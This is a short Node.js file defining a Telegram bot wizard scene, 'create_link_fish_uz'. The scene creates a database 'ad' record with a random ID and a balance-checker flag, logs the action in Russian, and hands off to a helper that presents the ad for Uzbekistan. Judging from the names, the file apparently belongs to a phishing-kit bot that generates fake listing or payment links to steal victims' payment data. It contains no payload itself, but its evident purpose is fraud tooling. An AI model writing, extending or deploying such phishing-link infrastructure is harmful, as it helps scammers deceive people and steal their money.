const WizardScene = require("telegraf/scenes/wizard");
const { Ad, Service } = require("../../database");
const log = require("../../helpers/log");
const rand = require("../../helpers/rand");
const menu = require("../../commands/menu");
const getAd = require("../../helpers/getAd");

const scene = new WizardScene("create_link_fish_uz", async (ctx) => {
  try {
    const service = await Service.findOne({
      where: {
        code: ctx.scene.state.service,
      },
    });
    if (!service) {
      await ctx.scene.reply("❌ Сервис не существует").catch((err) => err);
      return ctx.scene.leave();
    }
    ctx.scene.state.data = {};
    const id = parseInt(rand(999999, 99999999) + new Date().getTime() / 10000);
    const ad = await Ad.create({
      id: id,
      userId: ctx.from.id,
      ...{ title: id, price: "", name: id, address: "", balanceChecker: "false" },
      serviceCode: ctx.scene.state.service,
    });

    log(ctx, `создал объявление <code>(ID: ${ad.id})</code>`);
    getAd(ctx, "🇺🇿 Узбекистан", ad, service);
    ctx.updateType = "message";
    return ctx.scene.leave();
  } catch (err) {
    ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
    return ctx.scene.leave();
  }
});

//scene.leave(menu);

module.exports = scene;
